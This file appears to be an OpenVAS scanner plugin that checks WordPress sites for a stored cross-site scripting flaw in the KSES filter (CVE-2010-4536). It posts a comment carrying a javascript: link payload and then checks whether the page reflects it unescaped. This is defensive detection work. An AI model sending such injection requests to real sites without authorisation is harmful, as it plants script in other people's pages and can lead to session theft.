###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_kses_library_xss_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# WordPress KSES Library Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801807");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-01-12 13:59:47 +0100 (Wed, 12 Jan 2011)");
  script_cve_id("CVE-2010-4536");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("WordPress KSES Library Cross Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/42755");
  script_xref(name:"URL", value:"http://wordpress.org/news/2010/12/3-0-4-update/");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/3335");
  script_xref(name:"URL", value:"http://core.trac.wordpress.org/changeset/17172/branches/3.0");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to insert arbitrary HTML and
  script code, which will be executed in a user's browser session in the
  context of an affected site when the malicious data is being viewed.");
  script_tag(name:"affected", value:"WordPress versions prior to 3.0.4");
  script_tag(name:"insight", value:"The flaw is caused by input validation errors in the 'KSES HTML/XHTML' filter
  (wp-includes/kses.php) when processing user-supplied data, which could be
  exploited by attackers to execute arbitrary script code on the user's
  browser session in the security context of an affected site.");
  script_tag(name:"solution", value:"Upgrade to WordPress version 3.0.4 or later");
  script_tag(name:"summary", value:"The host is running WordPress and is prone to Cross site scripting
  vulnerability.");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/download/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);

if (dir == "/") dir = "";
hostname = http_host_name(port:port);

req = string("POST ",dir,"/wp-comments-post.php HTTP/1.1\r\n",
             "Host: ",hostname,"\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: 202\r\n\r\n",
             "author=openvas&email=openvas%40openvas.com&url=&comment=",
             "%3Ca+HREF%3D%22javascript%3Aalert%28%27OpenVAS-XSS-Test%27",
             "%29%22%3Eclick+me%3C%2Fa%3E%0D%0A&submit=Post+Comment&",
             "comment_post_ID=1&comment_parent=0\r\n");
## Posting Exploit
res = http_keepalive_send_recv(port:port, data:req);
if(res)
{
  req = http_get(item:string(dir,"/?p=1") , port:port);
  req = string(chomp(req), "\r\nCookie:  wordpress_test_cookie=WP+Cookie",
               "+check; comment_author_b462bdda0bcb111e62778a273812ce8d=",
               "openvas; comment_author_email_b462bdda0bcb111e62778a2738",
               "12ce8d=openvas%40openvas.com; wp-settings-time-1=1286081",
               "909; styleid=2; MANTIS_STRING_COOKIE=3bbb6343d231dee2d97",
               "d1f2f7ad0bca9307f8b3658b4a787777e798b51b34d3e; MANTIS_se",
               "cure_session=1; a9afec1a17f5a08fb9f206664b598b03=50beab4",
               "8bfb69dddb667287804d15af8; 6ffbe6d1f3f091552afc42d593883",
               "593=6fdef1a680a30716bca44ff6ba80a1ad; PHPSESSID=4a8b9d2f",
               "88d6b4f0fba887b49a18022d\r\n\r\n");
  res = http_keepalive_send_recv(port:port, data:req);
  if((res =~ "HTTP/1\.. 200" && "javascript:alert('OpenVAS-XSS-Test')">< res))
  {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
